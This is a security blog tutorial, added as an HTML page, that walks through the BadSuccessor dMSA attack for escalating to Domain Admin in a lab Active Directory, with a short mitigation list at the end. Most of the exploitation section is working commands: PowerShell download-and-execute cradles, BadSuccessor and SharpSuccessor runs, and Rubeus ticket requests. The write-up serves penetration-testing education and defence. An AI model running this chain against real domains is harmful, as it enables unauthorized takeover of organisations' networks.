@@ -1,0 +1,199 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/domain-escalation/" rel="category tag">Domain Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Abusing BadSuccessor (dMSA): Stealthy Privilege Escalation</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2025-07-24T11:32:49+00:00">July 24, 2025</time><time class="updated" datetime="2025-07-24T11:44:46+00:00">July 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong>BadSuccessor (dMSA)</strong> is a dangerous vulnerability in Windows Active Directory that allows attackers to achieve domain admin access through privilege escalation. By exploiting misconfigurations in domain Managed Service Accounts (dMSA), the BadSuccessor exploit provides a stealthy path to unauthorized admin access while evading detection. This makes it a critical threat to enterprise networks.</span></p>
+<p><span style="color: #000000;">Learn how the <strong>BadSuccessor dMSA exploit</strong> works, its <strong>impact on Active Directory security</strong>, and the best <strong>mitigation strategies</strong> to prevent <strong>domain admin compromise</strong>.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the Badsuccessor dMSA Abuse</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+<li><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation </strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Overview the Badsuccessor dMSA Abuse</span></h3>
+<p><span style="color: #000000;"><strong>BadSuccessor</strong> is a post compromise <strong>privilege escalation technique</strong> that targets a new feature in <strong>Windows Server 2025</strong>; <strong>Delegated Managed Service Accounts (dMSAs)</strong>. This technique takes advantage of vulnerabilities in the <strong>dMSA</strong> configuration, allowing attackers to escalate their privileges within Active Directory environments after an initial compromise, potentially granting them higher-level access or control over critical systems.</span></p>
+<p><span style="color: #000000;">In essence, it exploits:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Weak ACLs on Organizational Units (OUs):</strong> Attackers with low privileges but write rights on an OU can create or modify dMSAs.</span></li>
+<li><span style="color: #000000;"><strong>msDS-DelegatedMSAState and msDS-ManagedAccountPrecededByLink:</strong> Attributes that allow linking dMSAs to privileged accounts.</span></li>
+<li><span style="color: #000000;"><strong>Kerberos quirks:</strong> Rogue dMSAs inherit the security context of the linked privileged account, allowing attackers to obtain TGTs and TGSs as Domain Admins.</span></li>
+</ul>
+<p><span style="color: #000000;">This attack is particularly dangerous because it allows an attacker with minimal delegated permissions (like <strong>write rights on an Organizational Unit (OU)</strong>) to:</span></p>
+<ul>
+<li><span style="color: #000000;">Create a rogue dMSA</span></li>
+<li><span style="color: #000000;">Link it to a privileged account (e.g., Domain Admin)</span></li>
+<li><span style="color: #000000;">Obtain Kerberos tickets that inherit the target’s security context</span></li>
+<li><span style="color: #000000;">Pivot to full domain control</span></li>
+</ul>
+<p><span style="color: #000000;">Unlike attacks that require password cracking or golden ticket creation, BadSuccessor is <strong>stealthy, lives entirely within AD’s supported features</strong>, and can often bypass detection systems.</span></p>
+<p><span style="color: #000000;"><em><strong>Note</strong>:</em><em>It’s a powerful reminder that “harmless” delegated permissions can cascade into full domain compromise.</em></span></p>
+<h3><span style="color: #800000;">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: Rubeus, sharpsuccessor, badsuccessor module</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">This guide skips building a fresh AD lab from scratch and instead assumes:</span></p>
+<ul>
+<li><span style="color: #000000;">Active Directory is deployed in local (in our case)</span></li>
+<li><span style="color: #000000;">Two domain users exist:</span></li>
+<li><span style="color: #000000;"><strong>shivam</strong> – an attacker-controlled low-privileged account</span></li>
+<li><span style="color: #000000;"><strong>Administrator</strong> – the high-value target account</span></li>
+<li><span style="color: #000000;">The attacker has <strong>write permissions on an OU (HACKME in our case)</strong></span></li>
+<li><span style="color: #000000;">Tools like <strong>Rubeus</strong> and <strong>SharpSuccessor</strong> are available on the attacker’s machine</span></li>
+</ul>
+<p><span style="color: #000000;">This mirrors <strong>real-world post exploitation scenarios</strong> where the attacker leverages delegated permissions already present in a production environment.</span></p>
+<p><span style="color: #000000;">Now, we proceed with the exploitation: The <strong>BadSuccessor</strong> exploit starts by exploiting <strong>dMSA misconfigurations</strong> in <strong>Windows Server 2025</strong> to <strong>create a low privileged user account</strong>. This foothold enables attackers to escalate privileges and gain <strong>Domain Admin</strong> access.</span></p>
+<h4><span style="color: #800000;">Create a Low-Privileged User Account</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user shivam Password@1 /add /domain</pre>
+<p><span style="color: #000000;">This Adds a low-privileged user (shivam) to the domain, providing us with a foothold for privilege escalation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQlOobV3hQ-psPKMd-sWWFwP0kCibLAMJvgeU4PPrOVx1NH4H8Fh-9XQIxvHFb2WfbSZPidOWrt5deBQAiy1ymZddalPC8R5fbzXqu5Qzjj73afbUYlYFYUiqJ6Wn5XfKyMxaptto_euPGr7l7NFMKlLYLAgcU50qHcoWS_peiy3zmv1TNQgOW4dTD-5Oi/s16000/0.png"/></span></p>
+<h4><span style="color: #800000;">Create a Writable OU (HACKME)</span></h4>
+<p><span style="color: #000000;">In ADUC:</span></p>
+<ul>
+<li><span style="color: #000000;">Right-click <strong>local → New → Organizational Unit</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLqfACgT2MtNXUCg23b0cRUs7f2CZZ37TZDabPvrFr-KC803RjQINoV64mQ4h0QHT27hgV6O_VFHLQxzIkw2OjxxHwN7BDj5VQT7vV1mw0nLyWa4F6L2yfiSnZE5fTMH8CHUTdXKK7Z0mT-7oQ4-qdAmr4gnI59ra0j9famcMUbW1a5xBBF9zDL4YI-JYB/s16000/1.png" alt="BadSuccessor dMSA Privilege Escalation" width="648" height="518"/></span></p>
+<ul>
+<li><span style="color: #000000;">Name it: <strong>HACKME</strong></span></li>
+<li><span style="color: #000000;">Click <strong>OK</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8SOfKBR3V9vHpUvEDeHAX_whgiqn1rkJcCFwYA3LY0GcN-nV05s1TFp2ywVJVQ1i_h-HCkRDTkCA8BkU1hMQvLP_NSUsP-5FWi4M8FCeEODeN5QaXAIsF-jfeS9l7LFOJfrdQy-vUib7pFJ8JUvjvAPScOpTwMZUhuLbWyQ8op4RjnjNLBotzfO3ByUZs/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Creating an attacker controlled Organizational Unit (OU), like HACKME, allows us to manage rogue domain Managed Service Accounts (dMSAs) without affecting more secure or monitored OUs. This isolation helps us avoid detection while maintaining control and persistence in the domain.</span></p>
+<h4><span style="color: #800000;">Grant shivam Write Permissions on the OU</span></h4>
+<p><span style="color: #000000;">In ADUC:</span></p>
+<p><span style="color: #000000;">Right-click <strong>HACKME → Properties → Security → Advanced</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTn9L3C7_V744HxsSS3jcK2XUo5bCpRYXSlYujzcnqUf-6uZZ2xRgSil3AD63Pt2CEa-2oGATTvWbhZWtrjs8gDjYpyih3XnjF785czsOny1aEXE3Z0oNA3oMQyj85rg1D5IOGj9UNGt8xQacOLyC9r9SxKzpesdbixSofbqIIB-oK1_46KXTA-K6EYtLe/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Add shivam and Grant: <strong>Write permissions</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Rights to <strong>Create All Child Objects</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcWLPP2mV0RvISwNxc9HPWOtfzdt1_T4wCE4HBflhy4lJXSO8Z12HQEaeCZ9F0OZwOMd8kRj_uVO-oIFtJEpqlDyozm3qzkGmsDAWj7wnv-tA1h7quaP2OWpS2DFLoofJLMGkzvdjJWaJ0AlOQ2-iohwGwUDXHAcxqdT-THrWfnNvNtlUd3th_3p4GKA21/s16000/4.png" alt="BadSuccessor dMSA Privilege Escalation" width="394" height="452"/></span></p>
+<p><span style="color: #000000;">The delegated access is a crucial requirement for the BadSuccessor attack, allowing shivam to modify dMSAs.</span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h3>
+<p><span style="color: #000000;">Now let’s begin with enumeration and exploitation</span></p>
+<h4><span style="color: #800000;">Load BadSuccessor and Check for Vulnerabilities</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1")
+BadSuccessor -mode check -Domain ignite.local</pre>
+<p><span style="color: #000000;">This downloads the BadSuccessor PowerShell module to assess the domain for exploitable configurations, verifying if dMSA abuse is feasible based on the current AD permissions and settings.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia1TPHUzaMUplozpOzRYtyvt-q1OsOhy-1Ps7kdJ8dOQTDAwTuKeM0jA3_3CaVtZaL06ACFHuY5gWWWn8B5_sHmSYlfHrETt9YCaBmqlCoi9Fspt8CNeSeiOlXAhwZBrzTQ7cnNADEq2DB5-1RjXcaikfwrZCbpGoI-ftCGQuBROuumW92-4sOjZKjIbhr/s16000/5.png"/></span></p>
+<h4><span style="color: #800000;">Audit OU Permissions</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1")</pre>
+<p><span style="color: #000000;">This reconnaissance step identifies OUs where users like shivam have the necessary permissions to create or modify dMSAs, confirming the potential for the attack.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK9FPP1qEM_viVS0wGnzzjiHh4xWPbhoAJh75SJkEIas2j_7sssVDm-2aEKV8e9Mczx527W-BltxJzX9lvw0Jx6bd2SDCY0jzdO2TAj5w9IDEEPGDMD7FN5p_ZJ0nkY2_JX0QjJYU3MA3bVRByctZkvVkhbsHqS-FuhImt90xBhk9ACMQ79IOCJilocC_1/s16000/7.png"/></strong></span></p>
+<h4><span style="color: #800000;">Exploit: Create Rogue dMSA and Link It to Administrator</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">BadSuccessor -mode exploit -Path "OU=HACKME,DC=ignite,DC=local" -Name "BAD_DMSA" -DelegateAdmin "shivam" -DelegateTarget "Administrator" -domain "ignite.local"</pre>
+<p><span style="color: #000000;">This creates a dMSA named BAD_DMSA and associates it with the Administrator account by modifying its attributes, exploiting Active Directory to treat BAD_DMSA as a successor, inheriting all Administrator privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjBPDRtWo4Sxz5gt5Vi8aB4DGFQHVxIELtDaCRr0e-3QX535lk4kIj2TKCzdP7aeomTPF7yeXgEnbpPfW_51M9TqW-25FGoPtJ03h9XGAD-za71IrXYAzBOzbaJEYOJlzhTiCPlsd-PgehX6poshCYd6chF3QmKhow-RS1bvqzOWA2PoJtn-fMpJJXqzZm/s16000/8.png" alt="BadSuccessor dMSA Privilege Escalation" width="1149" height="198"/></span></p>
+<h4><span style="color: #800000;">Attack Flow : Rogue dMSA Creation &amp; Linking</span></h4>
+<p><span style="color: #000000;">Let’s Understand how it does:</span></p>
+<p><span style="color: #000000;"><strong>Attacker</strong> (shivam)</span></p>
+<p><span style="color: #000000;"><strong>Step 1.</strong> Creates OU (HACKME) &amp; gets Write access</span></p>
+<p><strong><span style="color: #000000;">HACKME OU</span></strong></p>
+<p><span style="color: #000000;"><strong>Step 2</strong>. Creates BAD_DMSA Managed Service Account</span></p>
+<p><strong><span style="color: #000000;">BAD_DMSA dMSA</span></strong></p>
+<p><span style="color: #000000;"><strong>Step 3</strong>. Modifies attributes:</span></p>
+<ul>
+<li><span style="color: #000000;"><em>msDS-DelegatedMSAState → 2 (active)</em></span></li>
+<li><span style="color: #000000;"><em>msDS-ManagedAccountPrecededByLink → Administrator DN</em></span></li>
+</ul>
+<p><strong><span style="color: #000000;">Active Directory</span></strong></p>
+<p><span style="color: #000000;"><strong>Step 4</strong>. AD thinks BAD_DMSA is a legitimate successor to Administrator</span></p>
+<p><span style="color: #000000;"><em><strong>Result</strong>: BAD_DMSA inherits Administrator privileges at Kerberos level</em></span></p>
+<p><span style="color: #000000;">By abusing msDS-ManagedAccountPrecededByLink and setting msDS-DelegatedMSAState to active, BAD_DMSA$ is treated as a continuation of Administrator; enabling escalation without cracking hashes or resetting passwords.</span></p>
+<p><span style="color: #000000;"><em><strong>Note</strong>: This step is stealthy because no password, SIDHistory, or golden ticket creation occurs just a legitimate object manipulation inside an attacker writable OU.</em></span></p>
+<h4><span style="color: #800000;">Test Access to Sensitive Resources</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \\srv25.ignite.local\c$</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVAItDRR84hkbI2-yAkngUm-KkGdS43AuSlDYIg2fln1M8QYncBEvzjWIh7f0z8LJ2QfDeteBGd3lIael2SDRpmfN8NqhZdN6Z7dJcqM7GqCEnU8zDz8z2xCGdY747oI8iLGo1OoWibVAr-I0IlCGgtWxm8nGpGgqw3CgXymrjIOlCFRkmIiLU_NkBCtuX/s16000/9.png"/></span></p>
+<p><span style="color: #000000;"><strong>Expected</strong>: Access Denied – This shows there’s no privileged access before escalation.</span></p>
+<h4><span style="color: #800000;">Finalize dMSA Link with SharpSuccessor</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=HACKME,dc=ignite,dc=local" /account:shivam /name:BAD_DMSA</pre>
+<p><span style="color: #000000;">Building on the above step, SharpSuccessor automates and strengthens the link between BAD_DMSA$ and the Administrator account, solidifying the escalation pathway.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9MReC8gnxEKqNxAdGlnv5JeZIqQuF0ZaZcIsrdvfH7IMKSFjVS1Bb2b2ZL9JNbHh_1lQ_JqGQwNUT2i9gBQxD9cJBkyZ4-IxvAqOT-5VBiwkhmxdzFqK3wzDiN-LaWRSORWmeDamOn7bUYJLVytnWD8hKU4wTeWDmQmhQln0x3XrcYHph_lQ0bLDIK_yL/s16000/10.png" alt="BadSuccessor dMSA Privilege Escalation" width="1051" height="470"/></span></p>
+<h4><span style="color: #800000;">Request Delegation TGT with Rubeus</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\Rubeus.exe tgtdeleg /nowrap</pre>
+<p><span style="color: #000000;">This step allows us to obtain a delegation TGT, enabling further Kerberos requests and facilitating continued escalation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhF4kdylzJtUGXt60V1_JM80c9L17Bi9v1vLToK2expN0IZPZR1o0b-NVVulnaHHMyF392BmKHn_nOK61egvqyxt8sLZB_R3wRdRg6WEMvPyMLR3IsEJdXSc1tdvTLjx-TBP6-wfsq7D_tOwqfrSivliVFhyenlO3cdEm1Ofz_ftcedMgYLGAZrqCp3z8Ao/s16000/11.png"/></span></p>
+<h4><span style="color: #800000;">Request TGT as BAD_DMSA</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\Rubeus.exe asktgt /targetuser:BAD_DMSA$ /service:krbtgt/ignite.local /opsec /dmsa /nowrap /ptt /ticket:doIFjdCCX...</pre>
+<p><span style="color: #000000;">Here, we requests a TGT that now includes Administrator privileges, leveraging PAC substitution to bypass standard access controls.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkUPiAQxTnh397J2NvvyDaJOgR9zDgbEpRy6EqboIVH2eE0g96iOzcwTg4omm9JEjVdR82KzU4q5Yrznwr2xxZ_pkDbaNVIAeJNZXy7QuRbBhxQkyP5ZpvilaAcqEri3bCCZYW11Ik17CcWeDASPt06FfaQeUBAtTJ77sWa3xbc2G_qOOnLoMwwPqM5vDr/s16000/12.png" alt="BadSuccessor dMSA Privilege Escalation" width="1076" height="337"/></span></p>
+<h4><span style="color: #800000;">Attack Flow : Kerberos Ticket Abuse</span></h4>
+<p><span style="color: #000000;">Let’s Understand how it does:</span></p>
+<p><span style="color: #000000;">Attacker (shivam) using BAD_DMSA</span><br/>
+<span style="color: #000000;"><strong>Step 1.</strong> Rubeus requests TGT as BAD_DMSA</span></p>
+<p><span style="color: #000000;">Domain Controller (KDC)</span><br/>
+<span style="color: #000000;"><strong>Step 2.</strong> KDC checks BAD_DMSA’s attributes</span><br/>
+<span style="color: #000000;">Finds link to Administrator</span></p>
+<p><span style="color: #000000;">Kerberos PAC</span><br/>
+<span style="color: #000000;"><strong>Step 3.</strong> PAC populated with Administrator’s SIDs &amp; privileges</span></p>
+<p><span style="color: #000000;">TGT Issued</span><br/>
+<span style="color: #000000;"><strong>Step 4.</strong> Attacker uses TGT to request TGS for services (e.g., CIFS)</span></p>
+<p><span style="color: #000000;">Service (e.g., srv25.ignite.local)</span><br/>
+<span style="color: #000000;"><strong>Step 5.</strong> Grants access as Domain Admin</span></p>
+<p><span style="color: #000000;"><strong>Result</strong>: Full domain control via Kerberos authentication.</span></p>
+<p><span style="color: #000000;">Kerberos doesn’t distinguish between the original account and the dMSA successor when building the PAC. This is why TGT and TGS requests as BAD_DMSA$ now succeed for any domain resource accessible to Administrator.</span></p>
+<p><span style="color: #000000;">This abuse also sidesteps typical monitoring solutions that detect privilege escalation via password resets or SIDHistory injection.</span></p>
+<p><em><span style="color: #000000;"><strong>Note</strong>: This step demonstrates why Kerberos PAC inheritance is dangerous: the attacker’s TGT now effectively represents Administrator.</span></em></p>
+<p><span style="color: #000000;">Then, Rubeus sends the asktgs request for CIFs.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgphwqT8rVRGM3TUl02h9TaKHDCY_npWLl_pcgkhdQeDwFwhdQ0rktaa9SXO3vQ24L27g_9TeawJCTY12xefJcVquTHAqEhGvv8HpbCZECZytHJartCLFLqGumG4h8G7k5u0mg77s-6Kt3aXaYBUUhiOqOlN89EKwfQyPnqBaAnSaVJ3dq4VDODw5TmIz2E/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Note how the service cifs/srv25.ignite.local is specified, and the output shows successful ticket retrieval.</span></p>
+<h4><span style="color: #800000;">Request Service Ticket for File Server</span></h4>
+<p><span style="color: #000000;">We use Rubeus to request a TGS (Ticket Granting Service) for CIFS access on the file server by invoking the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\Rubeus.exe asktgs /user:BAD_DMSA$ /service:cifs/srv25.ignite.local /opsec /dmsa /nowrap /ptt /ticket:doIFzDCCBigAw...</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKBuNip7JMEhub8geK7jk2NtjamRfblhY-qH2E0In-YONb-VsXFHUvHR9qAv6X_uT6cW-lJDikfAQC6j1WDgGv6E7LWCai-O5IBMVQpVDgIUUIwLJ5l3HzP0E5B4F9vs1EXU3Yr6zxrwyQkZnqu-qLi747oBxMRF_yBbSHwgmRZXWcd-lBrIXNQIh44lCN/s16000/14.png"/></span><br/>
+<span style="color: #000000;">Before accessing resources, let’s inspect the delegated ticket</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjS6CWcsjgkKMfGYOK7MwZrGyMGlbro21DOGuif7oidve5KnudIt_ZaHx3Mu6ISAaIyKcJasrfkXXW0RVBv_IAlouHSOmYUphJF4RH6RAnNv_RnppJ_8ApxD7-SoX1akwV1yZgrVEbGSRdKgrrXLUKB4I8PIsqqoklaYKqsPikjvzzP80Gz7gSuxc8z9xvU/s16000/15.png" alt="BadSuccessor dMSA Privilege Escalation" width="961" height="515"/></span><br/>
+<span style="color: #000000;">We use the <strong>BAD_DMSA$</strong> account, now with Administrator privileges, to request a TGS for CIFS access on the file server. Thanks to PAC substitution, this TGS grants Admin-level access, enabling further actions or lateral movement within the network.</span></p>
+<p><span style="color: #000000;">After successfully obtaining a TGT for CIFS access on the file server, we now focus on acquiring a <strong>delegated TGT</strong>. The <strong>ok-as-delegate</strong> flag, which appears in the ticket, signifies that the ticket is trusted for delegation. This is a crucial development in the attack.</span></p>
+<p><em><span style="color: #000000;"><strong>Note</strong>: The flagged TGT allows the attacker to impersonate the <strong>Administrator</strong> account across trusted services, enabling access to other systems without re-authenticating or cracking passwords. This step facilitates further exploitation, lateral movement, and persistence within the network.</span></em></p>
+<p><span style="color: #000000;">The below screenshot shows the details of the Service Ticket (TGS) issued for cifs/srv25.ignite.local.</span><br/>
+<span style="color: #000000;">Key attributes:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Ticket Flags</strong>: Includes forwardable, ok as delegate, and renewable, showing it’s a fully functional ticket.</span></li>
+<li><span style="color: #000000;"><strong>PAC Data</strong>: Embedded PAC lists Administrator’s SIDs and group memberships, confirming privilege inheritance.</span></li>
+<li><span style="color: #000000;"><strong>Target Service</strong>: cifs/srv25.ignite.local – meaning the ticket is scoped for CIFS file server access.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjS9qO_pPzoxEBSBIP6eb6iJGqgy1ZS_16HFJT3PwuMShewAP1CELuFi-ldXRr1n0eS0fMc-JhX9s6RJte58omYd4Rbs_XHxhZ3IvCAoaLB9HsrPY-UzBQiaMnooQUTDQJiUcmUIk0fuAMeox90FcTuaVT99bw_eJgJFFnG_1oLVGj_t6czIMVehg347e3e/s16000/16.png"/></span><br/>
+<span style="color: #000000;">This confirms that the Kerberos session now fully impersonates Administrator. From here, we can pivot to any service in the domain</span></p>
+<h4><span style="color: #800000;">Confirm Domain Admin Access</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \\srv25.ignite.local\c$</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXUQHc6-MVA09m2kid-3y__8PGrhsMZ46xxirYQfm4IKph5norXkVkS9qnDZIxR5VaF-kytDEqvBu2TzFeErJloI40_7GlRS6U9gcT9SAGu4uSmCWn5eGEmHuKFBZlbnn_liUXSKIL6eRYBqw-69hmAP3R9rtkcNZZQtA6Sf5pqj7ykYgZdgdDsSv_5-mD/s16000/17.png" alt="BadSuccessor dMSA Privilege Escalation" width="645" height="323"/></span></p>
+<p><span style="color: #000000;"><strong>Result:</strong> Access to the admin only C$ share is granted. We now effectively owns the domain through Kerberos authentication.</span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">Restrict CreateChild and WriteDACL permissions on OUs.</span></li>
+<li><span style="color: #000000;">Monitor changes to msDS-DelegatedMSAState and msDS-ManagedAccountPrecededByLink (Event IDs 5136, 4662).</span></li>
+<li><span style="color: #000000;">Regularly audit dMSA configurations and permissions with <a href="https://www.hackingarticles.in/powershell-empire-for-pentester-mimikatz-module/">PowerShell</a> or <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/active-directory-enumeration-bloodhound/">BloodHound</a></span>.</span></li>
+<li><span style="color: #000000;">Disable unused dMSA functionality in environments not requiring it.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author</strong>: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" title="Windows Privilege Escalation: Server Operator Group">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Windows Privilege Escalation: Server Operator Group</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/" title="Windows Privilege Escalation: Stored Credentials (Runas)">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Windows Privilege Escalation: Stored Credentials (Runas)</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/aws-abusing-iam-policy-version/" rel="prev">AWS: Abusing IAM Policy Version</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/aws-iam-attachuserpolicy-abuse/" rel="next">AWS: IAM AttachUserPolicy Abuse</a></div></div>
+	</nav>        </div>
